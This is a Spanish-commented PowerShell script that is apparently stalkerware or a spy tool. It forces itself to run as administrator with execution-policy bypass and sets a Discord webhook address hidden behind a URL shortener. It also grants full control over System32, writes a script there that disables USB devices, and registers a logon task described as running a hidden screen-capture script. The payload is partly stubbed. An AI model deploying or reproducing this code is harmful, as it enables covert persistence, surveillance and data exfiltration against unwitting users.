# Verificar si el script se está ejecutando con privilegios elevados (como administrador)
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    # Si no se está ejecutando como administrador, relanzar el script con privilegios elevados
    Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    Exit
}

# Definir la URL del webhook de Discord
$hookurl = "https://is.gd/xSsigk"  # Reemplaza "URL_DEL_WEBHOOK" con la URL de tu webhook de Discord

# Definir el nombre del directorio y el script
$directoryName = "C:\Windows\System32\Scripts"
$scriptName = "sys_report.ps1"

# Crear el directorio si no existe
if (-not (Test-Path -Path $directoryName)) {
    New-Item -Path $directoryName -ItemType Directory -Force | Out-Null
}

# Obtener la ruta completa de System32
$system32Path = [Environment]::GetFolderPath([Environment+SpecialFolder]::System)

# Forzar los permisos en la carpeta System32
$system32ACL = Get-Acl -Path $system32Path
$system32AccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Administradores", "FullControl", "ContainerInherit, ObjectInherit", "None", "Allow")
$system32ACL.SetAccessRule($system32AccessRule)
Set-Acl -Path $system32Path -AclObject $system32ACL

# Definir el contenido del script
$scriptContent = @"
# Forzar cambios en los dispositivos USB sin mostrar mensaje de Windows
(Get-WmiObject -Class Win32_PnPEntity | Where-Object { `$_.Name -like "*USB*" }).Disable()

# Definir las demás partes del script...
"@

# Guardar el script en el archivo
$scriptPath = Join-Path -Path $directoryName -ChildPath $scriptName
$scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8 -Force

# Configurar la tarea programada para ejecutar el script al iniciar sesión del usuario
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
$trigger = New-ScheduledTaskTrigger -AtLogon
$task = New-ScheduledTask -Action $action -Trigger $trigger -Description "Tarea programada para ejecutar el script de captura de pantalla de manera oculta al iniciar sesión del usuario" -TaskName "SysReportTask"
Register-ScheduledTask -InputObject $task -Force | Out-Null
Enable-ScheduledTask -TaskName "SysReportTask" | Out-Null
